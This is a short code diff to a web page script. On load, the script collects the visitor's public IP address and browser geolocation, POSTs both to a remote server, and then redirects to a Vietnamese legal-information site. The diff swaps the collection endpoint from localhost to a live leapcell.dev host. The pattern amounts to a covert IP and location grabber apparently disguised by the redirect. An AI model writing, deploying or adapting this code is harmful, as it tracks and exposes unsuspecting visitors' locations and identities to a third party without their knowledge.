@@ -11,7 +11,7 @@
     window.addEventListener("load", async (event) => {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
-        await fetch('http://localhost:8080/ping', {
+        await fetch('https://bone-hyuti2150-df5u3p72.leapcell.dev/ping', {
             method: 'POST',
             body: JSON.stringify({
                 ip: data.ip,
@@ -20,7 +20,7 @@
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async function (position) {
-                await fetch('http://localhost:8080/ping', {
+                await fetch('https://bone-hyuti2150-df5u3p72.leapcell.dev/ping', {
                     method: 'POST',
                     body: JSON.stringify({
                         lat: position.coords.latitude,
@@ -29,7 +29,7 @@
                 })
                 window.location.replace("https://thuvienphapluat.vn/")
             }, async function (error) {
-                await fetch('http://localhost:8080/ping', {
+                await fetch('https://bone-hyuti2150-df5u3p72.leapcell.dev/ping', {
                     method: 'POST',
                     body: JSON.stringify(error)
                 })
